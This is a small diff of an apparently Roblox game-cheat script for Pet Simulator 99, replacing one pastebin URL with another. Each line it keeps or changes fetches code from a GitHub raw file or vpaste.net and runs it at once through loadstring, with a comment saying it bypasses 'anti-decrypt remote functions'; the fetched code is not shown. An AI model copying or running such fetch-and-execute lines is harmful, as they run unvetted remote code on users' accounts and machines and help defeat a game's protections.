@@ -7,6 +7,5 @@ wait(0.5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Verteniastyy/PS99/refs/heads/main/chest_boost.lua", true))()
 
 -- This script is used to bypass anti-decrypt remote functions
-loadstring(game:HttpGet("http://vpaste.net/wSQ3C", true))()
-
+loadstring(game:HttpGet("http://vpaste.net/4D1iE", true))()
 
